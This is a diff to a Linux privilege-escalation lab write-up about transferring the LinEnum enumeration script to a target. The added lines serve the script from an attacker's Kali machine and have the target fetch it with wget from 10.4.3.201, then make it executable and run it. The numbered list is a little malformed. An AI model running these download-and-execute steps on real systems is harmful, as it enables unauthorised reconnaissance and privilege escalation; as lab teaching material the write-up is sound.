@@ -22,7 +22,18 @@ There are two ways to get LinEnum on the target machine.
 1. Go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using **"python3 -m http.server 8000"** . Then using **"wget"** on the target machine, and your local IP, you can grab the file from your local machine. Then make the file executable using the command **"chmod +x FILENAME.sh"**.
 2. if you have sufficient permissions, copy the raw LinEnum code from your local machine and paste it into a new file on the target, using Vi or Nano. Once you've done this, you can save the file with the **".sh"** extension. Then make the file executable using the command **"chmod +x FILENAME.sh"**.
 
-# **Exploiting SUID Files**
+Start a server from the directory that contains LinEnum.sh
+```bash
+(raz㉿kali)-[~/LinEnum]
+└─$ python -m http.server 9000
+```
+1. from the target use `wget http://10.4.3.201:9000/LinEnum.sh
+3. `chmod +x LinEnum.sh
+4. Run `./LinEnum.sh` to begin scan
+
+
+
+# Exploiting SUID Files
 
 
 
